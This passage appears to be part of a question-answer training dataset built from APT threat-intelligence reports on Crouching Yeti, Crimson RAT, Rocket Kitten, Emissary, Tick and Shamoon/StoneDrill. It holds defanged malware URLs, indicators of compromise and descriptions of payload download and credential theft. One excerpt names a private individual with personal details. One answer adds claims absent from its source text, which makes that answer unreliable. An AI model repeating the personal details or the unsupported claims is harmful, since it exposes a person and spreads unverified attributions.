    "instruction": "Medium Headline: Indicators of compromise\nFiles:\n%SYSTEM%\\TMPprovider0XX.dll\n%SYSTEM%\\svcprocess0XX.dll\n%SYSTEM%\\Phalanx-3d.Agent.dll\n%SYSTEM%\\Phalanx-3d.ServerAgent.dll\n%COMMON_APPDATA%\\TMPprovider0XX.dll\n%COMMON_APPDATA%\\Phalanx-3d.Agent.dll\n%COMMON_APPDATA%\\Phalanx-3d.ServerAgent.dll\n%APPDATA%\\TMPprovider0XX.dll\n%APPDATA%\\Phalanx-3d.Agent.dll\n%APPDATA%\\Phalanx-3d.ServerAgent.dll\n%APPDATA%\\sydmain.dll\n%TEMP%\\TMPprovider0XX.dll\n%TEMP%\\Phalanx-3d.Agent.dll\n%TEMP%\\Phalanx-3d.ServerAgent.dll\n%TEMP%\\srvsce32.dll\n%TEMP%\\~tmpnet.dll\n%TEMP%\\tmp687.dll\n%TEMP%\\*.xmd\n%TEMP%\\*.yls\n%TEMP%\\qln.dbx\n%TEMP%\\Low\\ddex.exe\n%TEMP%\\Low\\~tmppnet.dll\n%TEMP%\\Low\\~ntp.tmp\n%TEMP%\\Low\\~task.tmp\n%TEMP%\\Low\\~ldXXXX.TMP\n%TEMP%\\bp.exe\n%TEMP%\\~tmp1237.txt\nC: \\ProgramData\\\nC: \\ProgramData\\Cap\\\nC: \\ProgramData\\Mail\\\nC: \\ProgramData\\Mail\\MailAg\\\nC:\\ProgramData\\Cap\\Cap. exe\nC:\\ProgramData\\Mail\\MailAg\\scs.jpg\nC:\\ProgramData\\Mail\\MailAg\\scs.txt\nRegistry values:\nHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run@TMP provider\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run@TMP provider\nHKLM\\Software\\Microsoft\\Internet Explorer\\InternetRegistry@fertger\nHKCU\\\\Software\\Microsoft\\Internet Explorer\\InternetRegistry@fertger\nHKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows@\nLoad=\"%TEMP%\\Low\\ddex.exe\"\nHKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows@\nLoad=\"%TEMP%\\Low\\ddex.exe\"\nHKCU\\Software\\Microsoft\\Internet Explorer\\InternetRegistry\\SNLD@ID\nHKCU\\Software\\Microsoft\\Internet Explorer\\InternetRegistry\\SNLD@prv\nHKCU\\Software\\Microsoft\\Internet Explorer\\InternetRegistry\\SNLD@pubm\nHKCU\\Software\\Microsoft\\Internet Explorer\\InternetRegistry\\SNLD@pub\nHKCU\\Software\\Microsoft\\Internet Explorer\\InternetRegistry\\SNLD@nN (where N:=[0,x])\nHKCU\\Software\\Microsoft\\Internet Explorer\\InternetRegistry\\SNLD@pN (where N:=[0,x])\nHKCU\\Software\\Microsoft\\Internet Explorer\\InternetRegistry\\SNLD@sN (where N:=[0,x])\nMutexes:\n(6757)\n'HKCU/Identities/Default User ID'+'-18890}' example: {8B01CFB5-FF66-4404-89E2-\n27E06475EA38}-18890}\n{AD-18890}\n'HKCU/Identities/Default User ID'+'-01890}' example: {8B01CFB5-FF66-4404-89E2-\n27E06475EA38}-01890}\n{ED-01890}\nNamed pipes:\n\\\\.\\pipe\\mypype-f0XX\n\\\\.\\pipe\\mypype-g0XX\n\\\\.\\pipe\\mypipe-h0XX\nQ: In the context of the Crouching Yeti APT, what are some of the key indicators of compromise (IoCs) related to file paths and registry values? How can these IoCs help cybersecurity experts identify and mitigate potential threats associated with this APT group?",
    "output": "The Crouching Yeti APT uses specific file paths and registry values as indicators of compromise (IoCs). Some key IoCs include files located in system directories such as %SYSTEM%, %COMMON_APPDATA%, %APPDATA%, and %TEMP%. Examples of these files are TMPprovider0XX.dll, Phalanx-3d.Agent.dll, and sydmain.dll. Additionally, registry values such as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run@TMP provider and HKCU\\Software\\Microsoft\\Internet Explorer\\InternetRegistry@fertger are used. These IoCs are crucial for cybersecurity experts because they provide specific artifacts to search for during incident response and forensic analysis. By identifying these files and registry entries, experts can detect the presence of the Crouching Yeti APT on compromised systems, understand the extent of the infection, and take appropriate remediation actions. This includes isolating affected systems, removing malicious files, and resetting registry values to prevent further damage and data exfiltration.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Cluster 4 - DDNS and Pakistan\nThe final cluster we would like to discuss include several samples all using DDNS for their C&C pointing to Pakistan IP (according to Whois) addresses. The majority of this activity is from 2013. Based on the slightly different TTPs (purely DDNS usage) and no use of Contabo GmbH, we have clustered this separately from other activity, even though we have observed DDNS usage in Cluster 1 and the obvious overlap in tool usage. This activity is graphed in Figure 26 and included in the IOCs section.\nMedium Headline: One Cluster to Rule Them All, Nothing Yet to Bind Them...\nThere are numerous overlaps between the clusters, including usage of the \"Binder\" dropper, attack lures, and most obvious, the usage of Contabo GmbH. Unfortunately we lack information regarding some of the found samples as far as how they were used and in what campaigns, and so we have decided not to tie all the activity together. As we continue to research these incidents, we would not be surprised to find additional information linking all clusters together.\nMedium Headline: MSIL/Crimson\nCrimson is modular in the sense that additional payloads downloaded by the main RAT module are often utilized to perform functions such as keylogging and browser credential theft. Crimson infections also typically occur in stages. Crimson's first stage is a downloader component whose primary purpose is to download a more fully featured RAT, typically being the Crimson RAT component. The RAT component will then send system information to the C&C while the C&C will likely respond with additional module payloads.\nCrimson utilizes a custom TCP protocol for communicating to C&C (Fig. 27). Some of Crimson's optionally downloaded modules have no C&C capability and instead rely on the RAT component for information exfiltration.\nCrimson-infected victims may be spied on by their attackers via invasive methods such as through their webcam, stealing email from Outlook, and recording their screen. Some Crimson RAT variants support at least 40 individual commands, while all the individual commands throughout the different versions of the RAT we researched are listed and described in Table 1.\nTable 1. MSIL/Crimson supported commands\nSmall Headline: URLDownload\nWhen executed, this module will first check for the existence of a registry key: HKCU\\SOFTWARE\\Microsoft\\Windows\\ CurrentVersion\\last_edate . If the key does not exist then it will be created by the module and assigned a DateTime.Now string. This key is periodically checked for how many days have passed. Once the malware detects that at least 15 days have passed, a HTTP GET request is sent to a hardcoded location to retrieve a text file that should point to another HTTP location containing a final payload. For example, one analyzed sample (md5: 532013750ee3caac93a9972103761233) contained a hardcoded URL: hxxp://sahirlodhi[.]com/usr/api.txt. So far we have observed the attackers modify api.txt twice, first containing a link to: hxxp://bbmsync2727[.]com/upd/secure_scan.exe and then: hxxp://bbmsync2727[.]com/\nccmb/ssm.exe .\nIn the module that we analyzed, the downloader logic was configured to request a file from a hardcoded URL: hxxp:// sahirlodhi[.]com/usr/api.txt , which is likely a compromised website. The module expects that another URL will be stored at the previously retrieved URL, which initially we found to be the following: hxxp://bbmsync2727[.]com/upd/secure_scan. exe (md5: e456d6035e41962a4e49345b00393dcd). This payload is a MSIL/Crimson Downloader variant that, when executed, will begin the MSIL/Crimson lifecycle all over again by downloading a new controller/orchestrator.\nSmall Headline: secApp\nThe secApp that we analyzed (md5: ccfd8c384558c5a1e09350941faa08ab) contained functionality very similar to the initial downloader, however the initial beacon that is sent to the C&C was doupdat rather than updatc and was configured to connect to the same hardcoded C&C but to a different port. In addition to supporting the updatc command issued by the C&C, this module also supports the following commands: info, upsecs, and upmain. The info command supports the same functionality that the main RAT module supports while upsecs and upmain allows the controller to modify the path and application names for both the secApp and mainApp.\nSmall Headline: Credential Stealer\nThe pssApp is a password harvesting module that initially appears to support retrieving saved credentials from the Chrome, Firefox, and Opera browsers. Successfully harvested credentials are stored in a hardcoded location such as: %APPDATA%\\Roaming\\chrome\\chrome_update . If no credentials are found, the credential log will simply contain \"Not Found> > <\" while an example of successfully stolen credentials are shown in Figure xx. In our very limited testing, this module was not able to retrieve passwords from Opera 35.0.2066.68 or Firefox 44.0.2 but was successful with Chrome 48.0.2564.116 m.\nSome samples (md5: 8a991eec65bd90f12450ee9dac0f286a) also appear to support the retrieval of credentials from Windows Live, FileZilla, Vitalwerks' Dynamic Update Client (DUC), and Paltalk.\n\nDescribe the functionality of the secApp module within the MSIL/Crimson RAT, including its communication with the C&C server and the commands it supports.",
    "output": "The secApp module within the MSIL/Crimson RAT has functionality similar to the initial downloader but uses a different initial beacon command, 'doupdat', instead of 'updatc'. It connects to the same hardcoded C&C server but on a different port. In addition to supporting the 'updatc' command, the secApp module supports the following commands: 'info', 'upsecs', and 'upmain'. The 'info' command provides the same functionality as the main RAT module, while 'upsecs' and 'upmain' allow the controller to modify the path and application names for both the secApp and mainApp. This module enhances the RAT's capabilities by providing additional control and flexibility in managing the infected system.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 5.1 Attribution and Cyber Crime / Cyber Espionage\nDuring this investigation we collected malware samples used by the attackers, which were primarily PDFs that exploited vulnerabilities in Adobe Acrobat and Adobe Reader. In addition, we collected malware used by the attackers after successfully compromising a targeted system as well as network traffic captured from the OHHDL. We were able to map out the command and control infrastructure of the attackers and in several cases view data that allowed us to identify targets that had been compromised and recover exfiltrated documents. We did not have access to data regarding specific attacks on any of the targets we have identified. In other words, we cannot definitely tell how any one individual target was compromised. And, more importantly, we do not have data regarding the behaviour of the attackers once inside the target's network.\nHowever, we do have two key pieces of information: the first is an email address used in a document in the attackers' possession that provided steps on how the attackers could use Yahoo! Mail as a command and control server; the second is the IP addresses used by the attackers to send emails from Yahoo! Mail accounts used as command and control servers.\nEmail addresses used by the attackers have proven to provide critical clues in past investigations. Following the release of the GhostNet investigation, The Dark Visitor \u2014 a blog that researches Chinese hacking activities \u2014 investigated one of the email addresses we published that was used to register the domain names the attackers utilized as command and control servers. While these were not GhostNet domain names, one of them is the same as one used by the attackers in this investigation: lookbytheway.net (Henderson 2009a).\nThe email address used to register lookbytheway.net is losttemp33@hotmail.com. The Dark Visitor found forum posts made by losttemp33@hotmail.com, who also used the alias \"lost33.\" Further searching revealed \"an individual who was associated with Xfocus, Isbase,\" two popular Chinese hacking forums, and \"seems to have studied under Glacier\" (Henderson 2009b). Glacier is known as \"Godfather of the Chinese Trojan\" (Henderson 2007a), and an association with him indicates lost33's connections to the hacking underground in the PRC. Using information found on lost33's blog, The Dark Visitor was able to find another blog used by lost33, now operating under the alias \"damnfootman\", and had a text chat conversation with him on the Chinese instant messenger service QQ, where the individual admitted to being the owner of the email address losttemp33@hotmail.com.\nFrom this information, The Dark Visitor was able to determine this individual has connections to the forums of Xfocus and Isbase (the Green Army), NSfocus and Eviloctal, as well as connections to the hackers Glacier and Sunwear. He was born on July 24, 1982, lives in Chengdu, Sichuan, and attended the University of Electronic Science and Technology of China, which is also located in Chengdu.\nOur investigation also indicated strong links to Chengdu, Sichuan. The attacker used Yahoo! Mail accounts as command and control servers, from which the attacker sent emails containing new malware to the already compromised targets. All of the IP addresses the attacker used when sending these emails are located in Chengdu, Sichuan.\nWe were able to retrieve a document from the attackers that indicated the steps neccessary to use Yahoo! Mail accounts as command and control servers. There was also an account used by the attackers in this document for testing purposes. Searches for this email address returned several advertisements for apartment rentals in Chengdu, Sichuan.\nThe infrastructure of this particular network is tied to individuals in Chengdu, Sichuan. At least one of these individuals has ties to the underground hacking community in the PRC and to the University of Electronic Science and Technology of China in Chengdu. Interestingly, when the Honker Union of China, one of the largest hacking groups in the PRC, was re-established in 2005, its new leader was a student at the University of Electronic Science and Technology in Chengdu. Chengdu is also the location of one of the People's Liberation Army (PLA)'s technical reconnaissance bureaus tasked with signals intelligence collection. While it would be disingenuous to ignore these correlations entirely, they are loose at best and certainly do not meet the requirements of determining motivation and attribution. However, the links between the command and control infrastructure and individuals in the PRC provide a variety of scenarios that point toward attribution.\n\nBased on the above text, answer a question. What are the potential implications of the attackers' infrastructure being tied to individuals in Chengdu, Sichuan, and how does this relate to the broader context of the Chinese hacking community and military operations?",
    "output": "The infrastructure of the attackers' network being tied to individuals in Chengdu, Sichuan, suggests potential connections to the underground hacking community in the PRC and the University of Electronic Science and Technology of China in Chengdu. Notably, when the Honker Union of China, one of the largest hacking groups in the PRC, was re-established in 2005, its new leader was a student at the University of Electronic Science and Technology in Chengdu. Additionally, Chengdu is the location of one of the People's Liberation Army (PLA)'s technical reconnaissance bureaus tasked with signals intelligence collection. While these correlations are intriguing, they do not definitively prove motivation or attribution. However, they provide various scenarios that point toward possible attribution, highlighting the complexity of determining the origins and motives behind such attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: INVESTIGATION TIMELINE REVIEW\n[If you are familiar with previous publications and interested in Check Point's new insights, you may skip this section.]\nThe Rocket Kitten campaign/actor group has been studied and analyzed on multiple occasions by different vendors, threat intelligence groups and individual researchers. In a repeating challenge in the malware research domain, we have seen different reports introduce a myriad of code names and operation names for what may very well be the same campaign/actors.\nIn contrast to malware naming schemes, all reports are in unanimous agreement with strong indications of the campaign's Iranian origin. This thesis is supported by the individuals and verticals targeted, as part of a plethora of circumstantial and direct evidence. While we should keep in mind digital evidence can be forged and tailored to falsely masquerade as any attacker to deceive a forensic analyst, the overwhelming amount of independent evidence collected over years of attack activity render the notion of a false campaign extremely improbable.\nDespite all the reporting and sharing of malicious indicators, Check Point has detected continued active attacks using the same methods and infrastructure. These findings were confirmed by other security vendors, as well as Check Point's research partners.\nIt seems as if the attackers, unsophisticated as they are, are completely undeterred by the western security industry's revelations and publications. Often with the simple replacement of a domain name and minor updates to their malware tools, they continue to carry out their operation undisturbed.\nLet us try to review and briefly summarize points of interest from the publications so far.\n1 https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-operation-saffron-rose.pdf\n2 http://www.isightpartners.com/2014/05/newscaster-iranian-threat-inside-social-media/\n3 http://www.clearskysec.com/gholee-a-protective-edge-themed-spear-phishing-campaign/\n4 https://www.youtube.com/watch?v=WIhKovlHDJ0\n5 https://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-operation-woolen-goldfish.pdf\n6 http://www.clearskysec.com/wp-content/uploads/2015/06/Thamar-Reservoir-public1.pdf\n7 https://citizenlab.org/2015/08/iran_two_factor_phishing/\n8 http://documents.trendmicro.com/assets/wp/wp-the-spy-kittens-are-back.pdf\nThe May 2014 'Operation Saffron Rose' publication identifies an Iranian hacking group formerly named 'Ajax Security' (code-named 'Flying Kitten' by CrowdStrike) engaged in active spear phishing attacks on Iranian dissidents (those attempting to circumvent government traffic monitoring). This group is potentially linked to more recent Rocket Kitten attacks (different tools, yet very similar mode of operation and phishing domain naming scheme). No concrete evidence of such link has been presented yet.\nNewscaster by iSight Partners was released the same month, to detail similar efforts of persistent spear phishing backed by false social media identities pertaining to be journalists of the fake news web site 'newsonair.org.' iSight, who reportedly cooperated with the FBI, provides a clear Iranian attribution to these efforts. The report specifies the attackers targeted policymakers, senior military personnel and defense industry organizations in the US, UK and Israel. We did not find direct evidence linking this activity to Rocket Kitten.\nClearSky's September 2014 blog post first described active attacks using a piece of malware they dubbed 'Gholee' (as appears in a malicious payload export function, potentially named after a popular Iranian singer9). The researcher points to initial leads into other attacks and notes the threat is currently undetected by the overwhelming majority of AV products.\nImage 1\u2014the 'gholee' export name as noted by ClearSky.\nGadi & Tillman's presentation at 31c3 (the 31st Chaos Communication Congress in Germany) was the first clear identification of the Rocket Kitten attacker group, continuing the CrowdStrike naming scheme for Iranian attacker groups. The publication introduced the involvement of hacker persona 'Wool3n.H4t' and other identities in forensic evidence obtained from the malicious documents.\nImage 2\u2014Forensic artifact in malicious document hinting to file creator as noted by Tillman Werner & Gadi Evron.\n9 https://www.youtube.com/watch?v=yNFA8l0kIeQ\nThe researchers followed to describe two pieces of malware used by the attackers:\n\u2022 A deeper look into ClearSky's 'Gholee' determined it is the 'wrapper' component of an off-the-shelf penetration testing tool originally authored by Argentina-based Core Security. This legitimate PT tool, named 'Core Impact,' was illegally repurposed and used for malicious attacks by the Rocket Kitten group.\n\u2022 A .NET-based credential stealer that pilfers known certain credential storage locations in the infected computer and e-mails them to 'wool3n.h4t@gmail.com'. This tool appears to be named 'FireMalv' by the attackers.\nTrend Micro's March 2015 publication reintroduces the 'Gholee' malware (as GHOLE) campaign, and describes 'Operation Woolen Goldfish,' as well as an additional 'CWoolger'\u2014an unsophisticated key-logger apparently named 'woolger' (likely a Portmanteau for 'wool3n keylogger') written in C++, and present evidence showing its existence starting 2011.\nC:\\Users\\Wool3n.H4t\\Documents\\Visual Studio 2010\\Projects\\C-CPP\\CWoolger\\Release\\CWoolger.pdb\nThe researchers continue to point at the very likely attribution to the Wool3n.H4T identity as the malware author, whose only online reference was found in an Iranian blogging platform.\nImage 4\u2014wool3nh4t.blog.ir as pointed to by Trend Micro researchers\nIn this publication, Trend Micro researchers document Rocket Kitten's minor update to the Gholee malware (the 'gholee' function was renamed to 'function'), supposedly to avoid the Yara signature published by ClearSky and document the existence of Gholee malware samples dating March 2011, as further evidence for historic attacker activity.\nClearSky continued their investigations into the group's activities and in June 2015 published a paper dubbing the attack campaign 'Thamar Reservoir' named after Dr. Thamar E. Gindin, herself a Rocket Kitten target. ClearSky researchers notably mention the breach of an Israeli academic institution to serve as a hosting service for the phishing web site, and follow to present an OPSEC (operational security) failure by the attackers that allowed ClearSky to learn of a detailed (partial) target list.\nImage 5\u2014Partial target country distribution as visible on the phishing server logs exposed by ClearSky\nThis list was analyzed to confirm a strong alignment with nation-state political interests, with specific victims known as adversarial or of intelligence value to Iran. ClearSky also reference an inadvertent public confirmation for the Iranian attribution by the US Department of Treasury in a memo which briefly appeared online, before being deleted.\nClearSky provided many examples of personalized phishing e-mails and communication, including phone calls to victims luring them to open these attachments, demonstrating the group's persistency and breadth of operations.\nImage 6 \u2013 Custom- tailored phishing page as presented by ClearSky\nThe same phishing phone calling scheme was detailed in an August 2015 report by Citizen Lab, describing attempts to lure victims to provide their two-factor authentication tokens. In these attempts, victims receive tailored calls from a person who has clearly researched them, prompting them to take action on received e-mails. Among targeted victims Citizen Lab mention EFF's Director for International Freedom of Speech Jillian York. The Citizen Lab report describes overlapping phishing domains with ones previously reported, confirming a link with Rocket Kitten.\nImage 7\u2014Google password reset phishing page as presented by Citizen Lab\nInterestingly, a special update to the Citizen Lab publication was added to include a response from a news outlet reported to be in close connection with Iranian intelligence, following allegations by exiled Iranian journalist Omid Memarian attributing these attacks to Iranian Revolutionary Guards10 with 'no doubt.' The response mocks the 'Western Media fishing in muddy waters' and describe the allegations as 'weird.'\nThe latest paper from Trend Micro and ClearSky (dated September 2015) goes a great length to detail the group's profile and mode of operations so far, and introduces a few more attack incidents, as well as a new 'downloader' piece of malware.\n10 A branch of the Iranian armed forces, sworn to protect the country's Islamic system and prevent 'foreign interference'.\n\nBased on the above text, answer a question. What operational security (OPSEC) failure by the Rocket Kitten group allowed researchers to gain insight into their target list, and what did this reveal about their objectives?",
    "output": "An operational security (OPSEC) failure by the Rocket Kitten group allowed ClearSky researchers to access a detailed (partial) target list from the phishing server logs. This list revealed a strong alignment with nation-state political interests, with specific victims known as adversarial or of intelligence value to Iran. The list included high-ranking defense officials, embassies, human rights activists, media, journalists, academic institutions, and scientists, indicating the group's focus on targets of strategic importance to Iran.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Emissary Trojan Changelog: Did Operation Lotus Blossom Cause It to Evolve? \u00adPalo Alto Networks Blog\nposted by: and on February 3, 2016 11:00 AM\nIn December 2015, Unit 42 about a cyber espionage attack using the Emissary Trojan as a payload. Emissary is related to the Elise Trojan and the attack campaign, which prompted us to start collecting additional samples of Emissary.\nThe oldest sample we found was created in 2009, indicating this tool has been in use for almost seven years. Of note, this is three years earlier than the oldest Elise sample we have found, suggesting this group has been active longer than previously documented. In addition, Emissary appears to only be used against Taiwanese or Hong Kong based targets, all of the decoys are written in Traditional Chinese, and they use themes related to the government or military.\nWe also found several different versions of Emissary that had several iterative changes that show how the Trojan evolved over the years. One of the most interesting observations made during this analysis is that the amount of development effort devoted to Emissary significantly increased after we published our report in June 2015, resulting in many new versions of the Emissary Trojan. In addition, we observed a TTP shift post publication with regards to their malware delivery; they started using compromised but legitimate domains to serve their malware. Interestingly, the C2 infrastructure is also somewhat different than that used by Elise.\nQuestion: Why did the development effort devoted to the Emissary Trojan significantly increase after the publication of the report in June 2015, and what were the notable changes in its tactics, techniques, and procedures (TTPs) post-publication?",
    "output": "Answer: The development effort devoted to the Emissary Trojan significantly increased after the publication of the report in June 2015 likely due to the increased scrutiny and awareness brought by the report. This led to the creation of many new versions of the Emissary Trojan. Additionally, a notable change in TTPs was observed post-publication, where the attackers started using compromised but legitimate domains to serve their malware. This shift indicates an attempt to evade detection and maintain the effectiveness of their operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "The slow Tick\u2011ing time bomb: Tick APT group compromise of a DLP software developer in East Asia\nMarch 14, 2023\nESET Research uncovered a campaign by APT group Tick against a data-loss prevention company in East Asia and found a previously unreported tool used by the group\n14 Mar 2023 - 11:30AM\nESET researchers discovered a campaign that we attribute with high confidence to the APT group Tick. The incident took place in the network of an East Asian company that develops data-loss prevention (DLP) software.\nThe attackers compromised the DLP company's internal update servers to deliver malware inside the software developer's network, and trojanized installers of legitimate tools used by the company, which eventually resulted in the execution of malware on the computers of the company's customers.\nIn this blogpost, we provide technical details about the malware detected in the networks of the compromised company and of its customers. During the intrusion, the attackers deployed a previously undocumented downloader named ShadowPy, and they also deployed the (<https://gsec.hitb.org/materials/sg2019/D1%20COMMSEC%20-%20Tick%20Group%20-%20Activities%20Of%20The%20Tick%20Cyber%20Espionage%20Group%20In%20East%20Asia%20Over%20The%20Last%2010%20Years%20-%20Cha%20Minseok.pdf>)Netboy backdoor (aka ) and  downloader.\nBased on Tick's profile, and the compromised company's high-value customer portfolio, the objective of the attack was most likely cyberespionage. How the data-loss prevention company was initially compromised is unknown.\nBig Headline: Key points in this blogpost:\nESET researchers uncovered an attack occurring in the network of an East Asian data-loss prevention company with a customer portfolio that includes government and military entities.\nESET researchers attribute this attack with high confidence to the Tick APT group.\nThe attackers deployed at least three malware families and compromised update servers and tools used by the company. As a result, two of their customers were compromised.\nThe investigation revealed a previously undocumented downloader named ShadowPy.\nBig Headline: Attack overview\nIn March 2021, through unknown means, attackers gained access to the network of an East Asian software developer company.\nThe attackers deployed persistent malware and replaced installers of a legitimate application known as (<https://www.softwareok.com/?seite=Freeware/Q-Dir>)Q-dir with trojanized copies that, when executed, dropped an open-source VBScript backdoor named , as well as a copy of the legitimate Q-Dir application. This led to the execution of malicious code in networks of two of the compromised company's customers when the trojanized installers were transferred via remote support software \u2013 our hypothesis is that this occurred while the DLP company provided technical support to their customers.\nThe attackers also compromised update servers, which delivered malicious updates on two occasions to machines inside the network of the DLP company. Using ESET telemetry, we didn't detect any other cases of malicious updates outside the DLP company's network.\nThe customer portfolio of the DLP company includes government and military entities, making the compromised company an especially attractive target for an APT group such as Tick.\nBig Headline: Timeline\nAccording to ESET telemetry, in March 2021 the attackers deployed malware to several machines of the software developer company. The malware included variants of the Netboy and Ghostdown families, and a previously undocumented downloader named ShadowPy.\nIn April, the attackers began to introduce trojanized copies of the Q-dir installers in the network of the compromised company.\nIn June and September 2021, in the network of the compromised company, the component that performs updates for the software developed by the compromised company downloaded a package that contained a malicious executable.\nIn February and June 2022, the trojanized Q-dir installers were transferred via remote support tools to customers of the compromised company.\nBig Headline: Compromised update servers\nThe first incident where an update containing malware was registered was in June, and then again in September, 2021. On both cases the update was delivered to machines inside the DLP company's network.\nThe update came in the form of a ZIP archive that contained a malicious executable file. It was deployed and executed by a legitimate update agent from software developed by the compromised company. The chain of compromise is illustrated in Figure 2.\nThe first detected case occurred in June 2021, and the update was downloaded from an internal server and deployed. The second case occurred in September 2021, from a public-facing server.\nThe malicious executable issues an HTTP GET request to http://103.127.124[.]117/index.html to obtain the key to decrypt the embedded payload, which is encrypted with the RC6 algorithm. The payload is dropped to the %TEMP% directory with a random name and a .vbe extension, and is then executed.\nAlthough we have not obtained the dropped sample from the compromised machine, based on the detection (VBS/Agent.DL), we have high confidence that the detected script was the open-source backdoor .\nUsing ESET telemetry, we didn't identify any customers of the DLP company who had received any malicious files through the software developed by that company. Our hypothesis is that the attackers compromised the update servers to move laterally on the network, not to perform a supply-chain attack against external customers.\nBig Headline: Trojanized Q-Dir installers\nQ-Dir is a legitimate application developed by SoftwareOK that allows its user to navigate four folders at the same time within the same window, as shown in Figure 3. We believe that the legitimate application is part of a toolkit used by employees of the compromised company, based on where the detections originated inside the network.\nAccording to ESET telemetry, starting in April 2021, two months before the detection of the malicious updates, the attackers began to introduce 32- and 64-bit trojanized installers of the application into the compromised company's network.\nWe found two cases, in February and June 2022, where the trojanized installers were transferred by the remote support tools helpU and ANYSUPPORT, to computers of two companies located in East Asia, one in the engineering vertical, and the other a manufacturing industry.\nThese computers had software from the compromised company installed on them, and the trojanized Q-dir installer was received minutes after the support software was installed by the users.\nOur hypothesis is that the customers of the compromised DLP company were receiving technical support from that company, via one of those remote support applications and the malicious installer was used unknowingly to service the customers of the DLP company; it is unlikely that the attackers installed support tools to transfer the trojanized installers themselves.\nMedium Headline: 32-bit installer\nThe technique used to trojanize the installer involves injecting shellcode into a cavity at the end of the Section Headers table \u2013 the application was compiled using 0x1000 for FileAlignment and SectionAlignment, leaving in a cavity of 0xD18 bytes \u2013 large enough to accommodate the malicious, position-independent shellcode. The entry point code of the application is patched with a JMP instruction that points to the shellcode, and is located right after the call to WinMain (Figure 4); therefore the malicious code is only executed after the application's legitimate code finishes its execution.\nThe shellcode, shown in Figure 5, downloads an unencrypted payload from http://softsrobot[.]com/index.html to %TEMP%\\ChromeUp.exe by default; if the file cannot be created, it gets a new name using the GetTempFileNameA API.\nMedium Headline: ReVBShell\nReVBShell is an open-source backdoor with very basic capabilities. The backdoor code is written in VBScript and the controller code is written in Python. Communication with the server is over HTTP with GET and POST requests.\nThe backdoor supports several commands, including:\nGetting computer name, operating system name, architecture, and language version of the operating system\nGetting username and domain name\nGetting network adapter information\nListing running processes\nExecuting shell commands and sending back output\nChanging current directory\nDownloading a file from a given URL\nUploading a requested file\nWe believe that the attackers used ReVBShell version 1.0, based on the main branch commit history on GitHub.\n\nWhat was the purpose behind the Tick APT group compromising the update servers of the DLP company, and how did they achieve this?",
    "output": "A: The purpose behind the Tick APT group compromising the update servers of the DLP company was likely to move laterally within the network rather than to perform a supply-chain attack against external customers. They achieved this by delivering malicious updates on two occasions to machines inside the network of the DLP company. The updates came in the form of a ZIP archive containing a malicious executable file, which was deployed and executed by a legitimate update agent from software developed by the compromised company.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: What is new in this report?\nThis report provides new insights into the Shamoon 2.0 and StoneDrill attacks, including:\n1. The discovery techniques and strategies we used for Shamoon and StoneDrill.\n2. Details on the ransomware functionality found in Shamoon 2.0. This functionality is currently inactive but could be used in future attacks.\n3. Details on the newly found StoneDrill functions, including its destructive capabilities (even with limited user privileges).\n4. Details on the similarities between malware styles and malware components' source code found in Shamoon, StoneDrill and NewsBeef.\nMedium Headline: 1.1. Shamoon: It's all about the \"resources\"\nFew people ever expected the return of Shamoon after four years of silence. This made the news from the Middle East on 17 November 2016 quite surprising, and sent multiple shockwaves through the industry. After the second wave of attacks, which took place on 29 November 2016, it became quite clear that Shamoon 2.0 was no longer an isolated incident, but part of a new series of attacks and we should expect more waves coming in. In order to make sure that Kaspersky Lab customers were protected, we started to develop specific detection strategies and hunt for possible new variants.\nTo create the new detections, we used multiple ideas:\n\u25cf The Shamoon wipers have their additional payloads stored as encrypted resources.\n\u25cf Just like in 2012, the early Shamoon 2.0 samples used resources with three very specific names - \"PKCS7\", \"PKCS12\" and \"X509\". Because of their uniqueness it was relatively easy to find and detect them just by the resource names and their high entropy. Unfortunately, newer versions had random resource names like \"ICO\", \"LANG\" and \"MENU\", so the ability to easily find new samples was lost.\nHowever, all programmers, especially malware writers, have their own habits, and the authors of Shamoon are no exception:\n\u25cf Since the Shamoon 1.0 story, from 2012 (6dd571b84470ad9caad30a6a6acf491e) until 2016 (2cd0a5f1e9bcce6807e57ec8477d222a) many samples had one additional encrypted resource with a specific, although non-unique name \"101\".\nThis finding got us thinking that the Shamoon attackers can re-use this pattern and we've investigated ways of using this to hunt for new, unknown malware generations from their side.\nAs researchers, we tested a lot of different approaches to find similar malicious samples based on this artefact, and one of them worked unexpectedly. Here's the logic we used to create the detection:\n1. We assumed that for the next waves of attack the authors would continue to recompile the Shamoon 2.0 version from 2016, while trying to avoid AV detection, so we focused mostly on the newest Shamoon versions.\n2. We assumed that the wiper would again enumerate all files inside folders, so it would still call Windows API functions FindFirstFile and FindNextFile.\n3. Because it uses encrypted resources, we assumed that it would find and load them with the Windows API functions FindResource and LoadResource.\n4. Inside all known versions of Shamoon 2.0, the resource \"101\" was found, with the following properties:\n\u25cf Level of entropy > 7.8 - that means the data inside is encrypted or compressed.\n\u25cf Size about 30 KB - we've decided to set the minimum limit at 20 KB.\n\u25cf Language = neutral (not set); all other resources had the languages \"Arabic (Yemen)\" or \"English United States\".\n\u25cf Does not contain an unencrypted PE executable file inside.\nAfter initial testing, we decided to add more search criteria to limit the number of possible false positive detections:\n\u25cf Shamoon samples had no digital signature, so the sample would be unsigned.\n\u25cf All known Shamoon samples with resource \"101\" had a maximum file size of 370 KB, so it's reasonable to limit the file size to twice that number - 700 KB.\n\u25cf The number of resources inside the sample should not be too high - less than 15.\nOur favorite malware hunting tool, , provides a rule-bused approach to create descriptions of malware families based on textual or binary patterns.\nHere's the detection rule we wrote using all the above conditions:\nWhile running the above Yara rule on Kaspersky Lab's samples selection, we found an interesting, fresh sample. After a quick analysis, we realized it was yet another wiper. However, it was not Shamoon, but something different. We've decided to call it StoneDrill.\nMedium Headline: 1.2. From StoneDrill to 